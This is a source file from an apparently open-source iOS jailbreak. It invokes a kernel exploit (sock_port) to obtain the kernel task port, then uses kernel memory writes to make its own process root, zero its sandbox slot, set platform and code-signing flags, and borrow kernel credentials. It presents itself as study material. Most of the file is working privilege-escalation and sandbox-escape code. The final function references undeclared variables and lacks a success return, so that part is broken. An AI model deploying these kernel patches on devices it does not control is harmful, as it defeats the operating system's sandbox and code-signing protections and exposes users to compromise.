//
//  blizzardJailbreak.c
//
//  Created by GeoSn0w on 8/10/20.
//  Copyright © 2020 GeoSn0w. All rights reserved.
//
#import <Foundation/Foundation.h>
#include "blizzardJailbreak.h"
#include "../sock_port/exploit.h"
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include <spawn.h>
#include "../sock_port/kernel_memory.h"
#include "../sock_port/offsetof.h"
#include "../sock_port/offsets.h"
#include "../PatchFinder/patchfinder64.h"
#include "../Kernel Utilities/kernel_utils.h"
#include "../Kernel Utilities/kexecute.h"
#include "BlizzardLog.h"
#include "../APFS Utilities/rootfs_remount.h"
#include "../APFS Utilities/snapshot_tools.h"
#include "../Kernel Utilities/kernSymbolication.h"
#include "../AMFI Utilities/amfi_utils.h"

#define BlizzardJailbreakPath(obj) strdup([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@obj] UTF8String])
int APFS_SNAPSHOT_EXISTS = 1;

mach_port_t tfp0 = 0;
uint64_t KernelBase;
uint64_t defaultCredentials;
uint64_t ourProc;

void platformize(pid_t pid) {
    if (!pid) return;
    
    uint64_t proc = proc_of_pid(pid);
    uint64_t task = rk64(proc + off_task);
    uint32_t t_flags = rk32(task + off_t_flags);
    t_flags |= 0x400; // add TF_PLATFORM flag, = 0x400
    wk32(task+off_t_flags, t_flags);
    uint32_t csflags = rk32(proc + off_p_csflags);
    wk32(proc + off_p_csflags, csflags | 0x24004001u); //patch csflags
}


int exploit_init(){
    printf("Blizzard Jailbreak\nby GeoSn0w (@FCE365)\n\nAn Open-Source Jailbreak for you to study and dissect :-)\n\n");
    tfp0 = get_tfp0();
    if (MACH_PORT_VALID(tfp0)){
        printf("Successfully got tfp0!\n");
        init_kernel_utils(tfp0);
        KernelBase = grabKernelBase();
        if (!KernelBase) {
            printf("ERROR: Failed to find kernel base\n");
            return 2;
        }
        kernel_slide = (uint32_t)(KernelBase - 0xFFFFFFF007004000);

        int ret = prepareKernelForPatchFinder(); // patchfinder
        if (ret != 0) {
            printf("Failed to initialize patchfinder\n");
            return 3;
        }
    
        printf("Initialized patchfinder\n");
        ourProc = findOurOwnProcess();
        rootifyOurselves();
        defaultCredentials = escapeSandboxForProcess(getpid());
        initializeKernelExecute();
        uint64_t kern_proc = proc_of_pid(0);
        printf("Kernel Proc is: 0x%llx\n", kern_proc);
        setcsflags(getpid()); // set some csflags
        platformize(getpid()); // set TF_PLATFORM
        return 0;
    } else {
        printf("ERROR: Could not get tfp0!\n");
        return -1;
    }
   
}

int cleanupAfterBlizzard(){
    restoreProcessCredentials(defaultCredentials, getpid()); // Give back our process' credentials, otherwise the device will act weird.
    terminateKernelExecute(); // Always clean up after your jailbreak components. Helps stability a lot.
    terminatePatchFinder();
    return 0;
}

int rootifyOurselves(){
    printf("Preparing to elevate own privileges to ROOT!\n");
    printf("    Current UID: %d\n", getuid());
    printf("    Current EUID: %d\n", geteuid());
    uint64_t proc = proc_of_pid(getpid()); // Get our PID's PROC structure.
    uint64_t ucred = rk64(proc + off_p_ucred); //Get our credentials.
    wk32(proc + off_p_uid, 0);
    wk32(proc + off_p_ruid, 0);
    wk32(proc + off_p_gid, 0);
    wk32(proc + off_p_rgid, 0);
    wk32(ucred + off_ucred_cr_uid, 0);
    wk32(ucred + off_ucred_cr_ruid, 0);
    wk32(ucred + off_ucred_cr_svuid, 0);
    wk32(ucred + off_ucred_cr_ngroups, 1);
    wk32(ucred + off_ucred_cr_groups, 0);
    wk32(ucred + off_ucred_cr_rgid, 0);
    wk32(ucred + off_ucred_cr_svgid, 0);
    
    printf("    New UID: %d\n", getuid());
    printf("    New EUID: %d\n", geteuid());
    
    if (getuid() != 501 && geteuid() != 501){
        printf("Successfully got ROOT!\n");
    } else {
        printf("ERROR: Failed to get ROOT!\n");
        return -1;
    }
    return 0;
}
int restoreProcessCredentials(uint64_t creds, pid_t pid){
    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = rk64(proc + off_p_ucred);
    uint64_t cr_label = rk64(ucred + off_ucred_cr_label);
    wk64(cr_label + off_sandbox_slot, creds);
    
    if (rk64(rk64(ucred + off_ucred_cr_label) + off_sandbox_slot) != 0){
        printf("Successfully restored the Sandbox!\n");
        return 0;
    } else {
        printf("ERROR: Failed to restore the Sandbox!\n");
        return -1;
    }
}
uint64_t escapeSandboxForProcess(pid_t proc_pid) {
    printf("Preparing to escape the sandbox...\n");
    uint64_t target_process;
    uint64_t ucred;
    uint64_t sb_cr_label;
    uint64_t default_creds;
    
    if (proc_pid == 0) {
        printf("ERROR: Will NOT mess with Kernel's PID...\n");
        return -2;
    }
    
    target_process = proc_of_pid(proc_pid);
    ucred = rk64(target_process + off_p_ucred);
    sb_cr_label = rk64(ucred + off_ucred_cr_label);
    default_creds = rk64(sb_cr_label + off_sandbox_slot);
    wk64(sb_cr_label + off_sandbox_slot, 0);
    
    /*
     As far as I am aware, the first slot is used by AMFI. Sandbox should be the second.
     Read Jonathan Levin's book on the Sandbox chaper for more details about the credentials.
     */
    
    if (rk64(rk64(ucred + off_ucred_cr_label) + off_sandbox_slot) == 0){
        printf("Successfully escaped the Sandbox!\n");
        return default_creds;
    } else {
        printf("ERROR: Failed to escape the Sandbox!\n");
        return -1;
    }
}

int rootifyProcessByPid(){
    return 0;
}

uint64_t findOurOwnProcess(){
    static uint64_t self = 0;
    if (!self) {
        self = rk64(current_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        printf("Found Ourselves at 0x%llx\n", self);
    } else {
        printf("ERROR: Cannot find our own process!\n");
    }
    return self;
}

uint64_t copyPIDCredentials(pid_t processToBeGivenCreds, pid_t donorProcess){
    printf("CredentialsCopier: Giving process %d process %d's credentials...\n", processToBeGivenCreds, donorProcess);
    uint64_t procFromPID = proc_of_pid(processToBeGivenCreds);
    uint64_t donorproc = proc_of_pid(donorProcess);
    uint64_t processCredentials = rk64(procFromPID + off_p_ucred);
    uint64_t donorcred = rk64(donorproc + off_p_ucred);
    
    if (procFromPID != 0 || donorcred != 0){
        wk64(procFromPID + off_p_ucred, donorcred);
        printf("CredentialsCopier: Successfully granted credentials from process!\n");
        return processCredentials;
    } else {
        printf("CredentialsCopier: Failed to copy credentials from process!\n");
        return -1;
    }
}

int remountFileSystem(){
    int returnValue = remountRootFS();

    if (returnValue == 0) {
        printf("ROOT FS REMOUNT: Successfully remounted!\n");
        return 0;
    } else {
        printf("ROOT FS REMOUNT: Failed to Remount!\n");
        return -1;
    }
}

int setcsflags(pid_t pid) {
    if (!pid) return NO;
    uint64_t proc = proc_of_pid(pid);
    uint32_t csflags = rk32(proc + off_p_csflags);
    uint32_t newflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    wk32(proc + off_p_csflags, newflags);
    
    if (rk32(proc + off_p_csflags) == newflags){
        printf("Successfully set CodeSign Flags!\n");
        return 0;
    } else {
        printf("Failed to set CodeSign Flags!\n");
        return -1;
    }
}

int spawnBinaryAtPath(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t pd;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
    if (rv) return rv;
    return 0;
}

int prepareKernelForPatchFinder(){
    NSString *kernelNewLocation;
    NSError *error;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSDateFormatter *dateTimeFormat = [[NSDateFormatter alloc] init];
    [dateTimeFormat setDateFormat:@"dd.MM.YY:HH.mm.ss"];
    
    NSString *PathToDocuments = [[[fileManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
    mkdir(strdup([PathToDocuments UTF8String]), 0777);
    kernelNewLocation = [PathToDocuments stringByAppendingPathComponent:[NSString stringWithFormat:@"%@_kernelcache", [dateTimeFormat stringFromDate:[NSDate date]]]];
    printf("Kernel Decompression: Copying Kernel to %s\n", [kernelNewLocation UTF8String]);
    
    [fileManager copyItemAtPath:@"/System/Library/Caches/com.apple.kernelcaches/kernelcache" toPath:kernelNewLocation error:&error];
    if (error) {
        printf("Kernel Decompression: Failed to copy the kernelcache with the following error: %s\n", [[error localizedDescription] UTF8String]);
        return 4;
    }
    
    if (decompressKernelCache(strdup([kernelNewLocation UTF8String]))) {
        printf("Kernel Decompression: Error initializing KernelSymbolFinder\n");
        return 4;
    }
    initializePatchFinderWithBase(0, (char *)[[kernelNewLocation stringByAppendingString:@".dec"] UTF8String]);
    return 0;
}

int installBootStrap(){
    int retval;
    printf("Blizzard BOOTSTRAP: Preparing to Bootstrap!\n");
    printf("Blizzard BOOTSTRAP: Creating a pre-jailbreak Snapshot! This will be useful in case we wanna un-jailbreak.\n");
    int checkSnap = verifySnapshot("/", "Calm-Before-The-Storm");
    
    if (checkSnap != APFS_SNAPSHOT_EXISTS){
        printf("Blizzard BOOTSTRAP: Temporarily setting kernel credentials\n");
        uint64_t creds = copyPIDCredentials(getpid(), 0);
        if (createNewAPFSSnapshot("/", "Calm-Before-The-Storm") == 0){
            list_snapshots("/");
            printf("Blizzard BOOTSTRAP: Successfully created the stock snapshot!\n");
            retval = 0;
        } else {
            printf("Blizzard BOOTSTRAP: FAILED to create the stock snapshot!\n");
            retval = -1;
        }
        uint64_t proc_smp = proc_of_pid(getpid());
        wk64(proc_smp + off_p_ucred, creds);
        return retval;
    } else {
        printf("Blizzard BOOTSTRAP: Safety Snapshot already exists! Will not make another one :-)\n");
        return 0;
    }
}

int getKernelCacheFromDevice(){
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        [formatter setDateFormat:@"dd.MM.YY:HH.mm.ss"];
        
        NSString *docs = [[[fileManager URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
        mkdir((char *)[docs UTF8String], 0777);
        newPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"%@_kernel", [formatter stringFromDate:[NSDate date]]]];
        
        printf("Copying Kernelcache from iOS system folders to %s\n", [newPath UTF8String]);
        
        // Make a copy of the kernel cache from the device
        [fileManager copyItemAtPath:@"/System/Library/Caches/com.apple.kernelcaches/kernelcache" toPath:newPath error:&error];
        if (error) {
            printf("Failed to copy the Kernel! You may not have enough permissions.\n");
            return -1;
        }        
}
